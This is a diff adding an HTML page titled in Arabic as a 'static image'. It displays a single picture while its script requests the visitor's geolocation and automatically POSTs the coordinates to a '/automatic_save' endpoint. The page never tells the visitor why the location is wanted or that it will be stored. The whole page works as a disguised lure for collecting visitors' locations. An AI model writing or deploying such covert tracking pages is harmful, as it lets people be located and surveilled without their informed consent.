@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صورة ثابتة</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        #image { 
+            display: block;
+            margin: 0 auto;
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>صورة ثابتة</h1>
+    <img id="image" src="/static/a.png" alt="صورة ثابتة">
+   
+
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+        } else {
+            console.log("Geolocation is not supported by this browser.");
+        }
+
+        function successCallback(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            console.log("Latitude: " + latitude + "°, Longitude: " + longitude);
+
+            // إرسال بيانات الموقع إلى السيرفر بشكل تلقائي
+            $.ajax({
+                url: '/automatic_save',
+                method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({latitude: latitude, longitude: longitude}),
+                success: function(response) {
+                    console.log(response.message);
+                },
+                error: function(xhr, status, error) {
+                    console.error('حدث خطأ أثناء محاولة حفظ الموقع:', error);
+                }
+            });
+        }
+
+        function errorCallback(error) {
+            console.error("Error getting geolocation:", error);
+        }
+    </script>
+</body>
+</html>
